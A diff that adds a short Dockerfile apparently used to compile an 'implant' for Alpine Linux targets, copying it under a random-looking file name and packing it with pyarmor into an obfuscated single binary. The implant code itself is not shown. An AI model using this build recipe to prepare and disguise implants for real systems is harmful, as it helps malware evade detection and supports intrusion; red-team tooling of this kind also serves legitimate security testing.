@@ -1,0 +1,17 @@
+# docker container to compile implant for alpine target
+FROM python:3.9.17-alpine
+
+RUN apk add --no-cache \
+    gcc \
+    musl-dev \
+    libffi-dev \
+    openssl-dev \
+    make \
+    py3-pip
+
+WORKDIR /app
+COPY stripped_implant.py d-ISkvI.py
+
+RUN pip install requests cryptography urllib3 pyarmor pyinstaller
+
+RUN pyarmor gen --pack onefile d-ISkvI.py
